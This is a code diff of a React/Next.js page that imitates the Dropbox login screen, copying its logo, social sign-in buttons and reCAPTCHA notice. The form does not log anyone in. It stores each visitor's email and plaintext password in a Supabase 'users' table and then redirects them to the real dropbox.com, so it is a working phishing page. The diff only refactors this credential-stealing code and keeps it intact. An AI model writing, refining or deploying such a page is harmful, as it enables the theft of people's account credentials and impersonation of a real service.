@@ -1,23 +1,23 @@
-"use client"; // This directive is still correct and necessary.
+"use client";
 
 import React, { useState } from 'react';
-// Reverted to the standard package import. This is the correct way.
 import { createClient } from '@supabase/supabase-js';
 
+// NOTE: The `metadata` export has been removed from this file.
+// Because this is a Client Component (`"use client"`), it cannot export metadata.
+// To set the page title, you should do it in the nearest parent Server Component,
+// which is typically the `layout.js` file in the same folder.
+
 // --- Supabase Setup ---
-// Make sure your .env.local file with these variables is in the project root.
 const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
 const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;
 
-// --- Supabase Client Initialization ---
-// We'll add a check to ensure the variables are loaded before creating the client.
 let supabase;
 if (supabaseUrl && supabaseAnonKey) {
   supabase = createClient(supabaseUrl, supabaseAnonKey);
 } else {
   console.error("Supabase URL or Anon Key is missing. Make sure to set them in .env.local");
 }
-
 
 // --- SVG Components ---
 const DropboxLogo = () => (
@@ -37,43 +37,48 @@ const AppleLogo = () => (
 );
 
 
-// --- Main Login Component ---
-const DropboxLogin = () => {
+// --- Main Page Component ---
+export default function LoginPage() {
     const [email, setEmail] = useState('');
     const [password, setPassword] = useState('');
-    const [loading, setLoading] = useState(false);
-    const [message, setMessage] = useState({ type: '', content: '' });
+    const [message, setMessage] = useState(''); // Simplified message state
 
-    const handleLogin = async (e) => {
+    const handleEmailLogin = async (e) => {
         e.preventDefault();
         
         if (!supabase) {
-            setMessage({ type: 'error', content: 'Supabase client is not initialized. Check your .env.local file.' });
+            setMessage('Supabase client is not initialized. Check your .env.local file.');
             return;
         }
 
-        setLoading(true);
-        setMessage({ type: '', content: '' });
+        setMessage(''); // Clear previous messages
 
         try {
-            // IMPORTANT: This now inserts data into a table named 'users'.
-            // Ensure you have a 'users' table in your Supabase project
-            // with 'email' and 'password' columns (both of type 'text').
             const { error } = await supabase
                 .from('users')
                 .insert([{ email: email, password: password }]);
 
             if (error) {
-                setMessage({ type: 'error', content: `Database error: ${error.message}` });
+                setMessage(`Database error: ${error.message}`);
             } else {
-                setMessage({ type: 'success', content: 'Data saved! Redirecting...' });
-                // Redirect after successfully saving the data.
+                // Redirect immediately on success
                 window.location.href = 'https://www.dropbox.com';
             }
         } catch (err) {
-            setMessage({ type: 'error', content: 'An unexpected error occurred.' });
-        } finally {
-            setLoading(false);
+            setMessage('An unexpected error occurred.');
+        }
+    };
+
+    const handleOAuthLogin = async (provider) => {
+        if (!supabase) {
+            setMessage('Supabase client is not initialized.');
+            return;
+        }
+        const { error } = await supabase.auth.signInWithOAuth({
+            provider: provider,
+        });
+        if (error) {
+            setMessage(`OAuth Error: ${error.message}`);
         }
     };
 
@@ -93,13 +98,18 @@ const DropboxLogin = () => {
                             or <a href="#" className="text-blue-600 hover:underline font-medium">create an account</a>
                         </p>
 
-                        {/* Social Logins (Functionality not implemented) */}
                         <div className="space-y-3 mb-6">
-                            <button className="w-full flex items-center justify-center px-4 py-3 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors duration-200">
+                            <button 
+                                type="button"
+                                onClick={() => handleOAuthLogin('google')}
+                                className="w-full flex items-center justify-center px-4 py-3 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors duration-200">
                                 <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt="Google logo" className="w-5 h-5 mr-3" />
                                 <span className="font-medium text-gray-700">Continue with Google</span>
                             </button>
-                            <button className="w-full flex items-center justify-center px-4 py-3 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors duration-200">
+                            <button 
+                                type="button"
+                                onClick={() => handleOAuthLogin('apple')}
+                                className="w-full flex items-center justify-center px-4 py-3 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors duration-200">
                                 <AppleLogo />
                                 <span className="font-medium text-gray-700">Continue with Apple</span>
                             </button>
@@ -111,11 +121,10 @@ const DropboxLogin = () => {
                             <div className="flex-grow border-t border-gray-300"></div>
                         </div>
 
-                        {/* Login Form */}
-                        <form onSubmit={handleLogin}>
-                            {message.content && (
-                                <p className={`text-sm mb-4 text-center ${message.type === 'error' ? 'text-red-500' : 'text-green-500'}`}>
-                                    {message.content}
+                        <form onSubmit={handleEmailLogin}>
+                            {message && (
+                                <p className="text-sm mb-4 text-center text-red-500">
+                                    {message}
                                 </p>
                             )}
                             <div className="space-y-5">
@@ -127,7 +136,6 @@ const DropboxLogin = () => {
                                         placeholder="Enter your email"
                                         value={email}
                                         onChange={(e) => setEmail(e.target.value)}
-                                        disabled={loading}
                                     />
                                 </div>
 
@@ -139,7 +147,6 @@ const DropboxLogin = () => {
                                         placeholder="Enter your password"
                                         value={password}
                                         onChange={(e) => setPassword(e.target.value)}
-                                        disabled={loading}
                                     />
                                 </div>
 
@@ -156,10 +163,9 @@ const DropboxLogin = () => {
                                 <div>
                                     <button 
                                         type="submit" 
-                                        className="w-full flex justify-center py-3 px-4 border border-transparent rounded-lg shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 transition-colors duration-200 disabled:bg-blue-400 disabled:cursor-not-allowed"
-                                        disabled={loading}
+                                        className="w-full flex justify-center py-3 px-4 border border-transparent rounded-lg shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 transition-colors duration-200"
                                     >
-                                        {loading ? 'Saving...' : 'Log in'}
+                                        Log in
                                     </button>
                                 </div>
                             </div>
@@ -169,7 +175,7 @@ const DropboxLogin = () => {
                     <div className="mt-6 text-center text-xs text-gray-500">
                         <p>This page is protected by reCAPTCHA and the Google <a href="#" className="text-blue-600 hover:underline">Privacy Policy</a> and <a href="#" className="text-blue-600 hover:underline">Terms of Service</a> apply.</p>
                     </div>
-                </div> 
+                </div>
             </main>
             
             <footer className="bg-gray-100 py-4 px-4 sm:px-6">
@@ -189,17 +195,4 @@ const DropboxLogin = () => {
             </footer>
         </div>
     );
-};
-
-export default function App() {
-  return (
-    <>
-      <style jsx global>{`
-        body {
-          font-family: 'Inter', sans-serif;
-        }
-      `}</style>
-      <DropboxLogin />
-    </>
-  );
 }
